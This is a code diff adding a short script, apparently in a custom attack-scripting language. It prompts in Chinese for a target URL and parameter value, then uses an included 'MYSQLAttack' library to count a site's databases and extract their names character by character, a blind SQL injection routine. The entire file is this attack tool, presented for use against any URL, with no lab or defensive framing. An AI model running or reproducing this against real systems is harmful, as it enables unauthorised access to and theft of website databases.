@@ -1,0 +1,22 @@
+#include ATTACKUTILS/MYSQLAttack.wker
+function main(args)
+{
+	print("请输入您要测试的URL(不要带参数的值):");
+	url =input();
+	print("请输入参数的默认值:");
+	par = input();
+	length = GetRealLength(url.Enc(par));
+	DataBaseNum = GetDataBaseNum(url,length,par);
+	i = 0;
+	while(i<DataBaseNum){
+		DataBaseLength =GetDataBaseLength(url,length,i,par);
+		j = 0;
+		DataBaseName= "";
+		while(j <DataBaseLength){
+			DataBaseName = DataBaseName.GetDataBaseStr(url,length,i,ToInt(j+1),par);
+			j=ToInt(j+1);
+		}
+		i = ToInt(i+1);
+		print(DataBaseName);
+	}
+}
